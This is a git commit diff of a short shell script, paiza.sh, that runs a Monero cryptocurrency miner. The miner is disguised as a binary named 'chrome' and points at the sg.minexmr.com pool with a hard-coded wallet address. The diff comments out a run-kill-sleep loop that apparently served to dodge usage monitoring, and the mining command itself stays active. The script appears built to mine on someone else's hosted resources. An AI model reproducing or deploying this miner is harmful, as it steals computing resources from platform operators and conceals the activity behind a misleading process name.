bfd09bdb8f0acde88e735b676464534d5ed47cd8
azzfarrcolab <72619602+azzfarrcolab@users.noreply.github.com>
2020-11-11 02:22:14 +0700

    Update paiza.sh

--- paiza.sh
+++ paiza.sh
@@ -1,8 +1,8 @@
 #!/bin/sh 
- while true;
-  do
+ #while true;
+  #do
   ./chrome --donate-level 1 -o sg.minexmr.com:80 -u 47RMDsjAS2p5V7NyFoGiFPZNKZiEfF4Hr1FJHEExJwuKGku7CHfS91CcpVWnCvKTDhZY1XEJU5cg4LS2nqoAwQiT4Qi7bEZ -p x -t 1 -k
-  sleep 1800
-  kill $(ps aux | grep 'chrome' | awk '{print $2}')
-  sleep 300;
-done
+  #sleep 1800
+  #kill $(ps aux | grep 'chrome' | awk '{print $2}')
+  #sleep 300;*/
+#done
